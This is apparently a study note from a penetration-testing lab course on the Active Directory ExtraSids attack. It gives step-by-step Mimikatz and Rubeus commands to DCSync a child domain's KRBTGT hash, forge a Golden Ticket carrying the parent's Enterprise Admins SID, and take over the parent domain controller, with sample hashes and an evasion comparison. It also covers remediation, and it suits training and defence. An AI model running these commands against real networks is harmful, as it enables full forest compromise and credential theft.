# Attacking Domain Trusts: Child to Parent (ExtraSids Attack)

The ExtraSids attack exploits the fact that SID filtering is not enforced within the same AD forest. By injecting the Enterprise Admins SID from the parent domain into the `sidHistory` attribute of a forged Golden Ticket, a user authenticated from a compromised child domain is treated as a member of that group across the entire forest. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

***

## SID History Primer

The `sidHistory` attribute was designed for migration scenarios. When a user account is moved between domains, the original SID is preserved in `sidHistory` on the new account so access to resources in the old domain is not broken. Within the same forest, DCs do not filter these SIDs during authentication. An attacker who controls a child domain can exploit this by crafting a ticket that includes the Enterprise Admins SID from the parent domain in the `sidHistory` field, which Windows will honour during access checks without the user being an actual member of that group. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

***

## Data Required Before the Attack

All five values must be collected before running the attack:

| Data Point | Value (Example) |
|-----------|----------------|
| KRBTGT NT hash (child domain) | `9d765b482771505cbe97411065964d5f` |
| Child domain SID | `S-1-5-21-2806153819-209893948-922872689` |
| Target username (can be fake) | `hacker` |
| Child domain FQDN | `LOGISTICS.INLANEFREIGHT.LOCAL` |
| Enterprise Admins SID (parent) | `S-1-5-21-3842939050-3880317879-2865463114-519` |

The target username does not need to exist in AD. The forged ticket is validated by the KRBTGT hash, not by checking whether the account is real. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

***

## Step-by-Step: Mimikatz Method

### Step 1: DCSync the KRBTGT hash from the child domain

From a Domain Admin session on the child DC:

```powershell
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
```

Grab the `Hash NTLM` value from `Credentials`. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

### Step 2: Get the child domain SID

```powershell
Get-DomainSID
# S-1-5-21-2806153819-209893948-922872689
```

This is also visible in the Mimikatz DCSync output under `Object Security ID`. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

### Step 3: Get the Enterprise Admins SID from the parent domain

```powershell
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```

The RID `-519` at the end of the SID always denotes the Enterprise Admins group. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

### Step 4: Confirm no access to parent DC (pre-attack)

```powershell
ls \\academy-ea-dc01.inlanefreight.local\c$
# Access is denied
```

### Step 5: Create the Golden Ticket and inject it into memory

```powershell
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

Flag breakdown:

- `/user` - any name, real or fake
- `/domain` - the child domain FQDN
- `/sid` - the child domain SID
- `/krbtgt` - the child domain KRBTGT NT hash
- `/sids` - the extra SID to inject (Enterprise Admins of the parent)
- `/ptt` - inject directly into the current session's memory

### Step 6: Verify ticket is in memory

```powershell
klist
# Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
# Cache Flags: 0x1 -> PRIMARY
```

### Step 7: Access the parent domain DC

```powershell
ls \\academy-ea-dc01.inlanefreight.local\c$
# Full directory listing returned
```

### Step 8: DCSync against the parent domain

```powershell
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
# Hash NTLM: 663715a1a8b957e8e9943cc98ea451b6
```

The `/domain` flag is required here since you are targeting a domain different from the one your session is in. Without it, Mimikatz may query the wrong DC. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

***

## Step-by-Step: Rubeus Method

Rubeus performs the same attack with a slightly cleaner syntax. The `/rc4` flag takes the KRBTGT NT hash and `/sids` injects the extra Enterprise Admins SID:

```powershell
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```

Rubeus will output the full base64-encoded `.kirbi` ticket blob, which can be saved for later use in pass-the-ticket operations on other hosts. Verify with `klist` the same way as the Mimikatz method. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

***

## Key Differences Between the Two Methods

| Factor | Mimikatz | Rubeus |
|--------|---------|--------|
| Ticket output | Injected directly, no file saved | Outputs base64 kirbi blob + injects |
| Hash flag | `/krbtgt:` | `/rc4:` |
| Portability | Inject only | Base64 blob can be reused elsewhere |
| Detection surface | Higher (known LSASS interaction) | Slightly lower for some EDR configurations |

***

## Why the Attack Works

Within a forest, the parent DC receives the Golden Ticket from the child domain. Because SID filtering is not applied intra-forest, the DC reads the `sidHistory` field and sees the Enterprise Admins SID. It then builds an access token that includes Enterprise Admins membership, granting full forest-level administrative rights. The KRBTGT hash is the root of trust for the entire child domain's Kerberos infrastructure, which is why compromising a child domain KRBTGT is effectively a path to compromising the parent. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

The only way to invalidate an existing Golden Ticket is to rotate the KRBTGT password twice (once to change it, once to invalidate sessions using the previous hash). This should be part of any post-compromise remediation recommendation in a penetration test report. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)
